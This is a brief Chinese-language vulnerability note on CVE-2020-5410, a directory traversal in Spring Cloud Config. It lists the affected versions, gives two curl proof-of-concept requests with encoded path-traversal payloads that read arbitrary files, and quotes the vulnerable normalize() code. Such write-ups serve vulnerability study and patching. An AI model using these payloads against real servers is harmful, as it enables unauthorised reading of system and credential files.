# CVE-2020-5410 Spring Cloud Config 目录穿越

影响版本：  
- 2.2.0 to 2.2.2  
- 2.1.0 to 2.1.8  

poc：
```java
curl http://127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fdd.txt%23/ddd
```
读取/etc/dd.txt文件

![](/PIC/linux_burp.png)
![](/PIC/linux_file.png)


```java
public static String normalize(String s) {
        if (s != null && s.contains(SLASH_PLACEHOLDER)) {
            // "(_)" is uncommon in a git repo name, but "/" cannot be matched
            // by Spring MVC
            return s.replace(SLASH_PLACEHOLDER, "/");
        }
        return s;
    }
```

org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)
利用此处把label处的(_)替换为/
curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx

todo 条件限制：
todo 1. 文件必须有后缀，也就是.txt等等。
todo 2. 不像利用点1处，不需要配置{application}{profiles}{label}
```

[@threedr3am](https://threedr3am.github.io/2020/03/09/spring-cloud-confg-server目录穿越(CVE-2019-3799%20and%20CVE-2020-5405)/)

```

```

```
